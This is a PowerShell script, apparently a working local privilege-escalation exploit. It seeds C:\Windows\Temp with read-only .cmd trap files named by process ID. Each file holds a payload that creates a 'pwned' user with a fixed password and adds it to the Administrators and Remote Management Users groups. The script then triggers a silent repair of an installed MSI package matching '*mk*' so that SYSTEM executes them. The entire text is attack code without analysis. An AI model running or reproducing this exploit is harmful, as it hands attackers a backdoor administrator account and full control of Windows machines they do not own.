$MinPID = 1000
$MaxPID = 15000
$BatchPayload = "@echo off`r`nnet user pwned P@ssw0rd123! /add`r`nnet localgroup administrators pwned /add`r`nnet localgroup `"Remote Management Users`" pwned /add"
$msi = (Get-ItemProperty 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Installer\UserData\S-1-5-18\Products\*\InstallProperties' | Where-Object { $_.DisplayName -like '*mk*' } | Select-Object -First 1).LocalPackage
Write-Host "[*] Seeding trap files..."
foreach ($ctr in 0..1) {
    for ($num = $MinPID; $num -le $MaxPID; $num++) {
        $filePath = "C:\Windows\Temp\cmk_all_$($num)_$($ctr).cmd"
        try {
            [System.IO.File]::WriteAllText($filePath, $BatchPayload, [System.Text.Encoding]::ASCII)
            Set-ItemProperty -Path $filePath -Name IsReadOnly -Value $true -ErrorAction SilentlyContinue
        } catch {}
    }
}
Write-Host "[*] Triggering repair..."
Start-Process "msiexec.exe" -ArgumentList "/fa `"$msi`" /qn" -Wait
